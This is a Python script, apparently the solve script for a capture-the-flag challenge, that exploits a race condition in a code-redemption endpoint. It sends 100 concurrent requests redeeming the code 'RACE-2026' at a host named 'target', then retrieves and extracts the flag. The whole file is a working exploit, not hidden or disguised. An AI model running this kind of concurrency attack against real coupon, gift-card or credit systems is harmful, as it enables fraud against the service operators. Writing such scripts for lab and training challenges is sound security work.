#!/usr/bin/env python3
import concurrent.futures
import re
import sys
import time
import urllib.request

URL = "http://target:8302"


def redeem():
    body = b'{"code": "RACE-2026"}'
    req = urllib.request.Request(
        f"{URL}/redeem", data=body, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode("latin1", "replace")
    except Exception as e:
        return None, str(e)


def main() -> int:
    for attempt in range(5):
        time.sleep(11)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
            results = list(ex.map(lambda _: redeem(), range(100)))
        ok = sum(1 for s, _ in results if s == 200)
        print(f"attempt {attempt+1}: successful redemptions: {ok}", file=sys.stderr)
        try:
            with urllib.request.urlopen(f"{URL}/flag", timeout=5) as r:
                body = r.read().decode("latin1", "replace")
        except Exception as e:
            print(f"flag fetch failed: {e}", file=sys.stderr)
            continue
        if "flag" in body:
            print(body)
            m = re.search(r"[A-Za-z0-9_]+\{[^}]+\}", body)
            if m:
                print(m.group(0), flush=True)
                return 0
    print("failed after 5 attempts", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
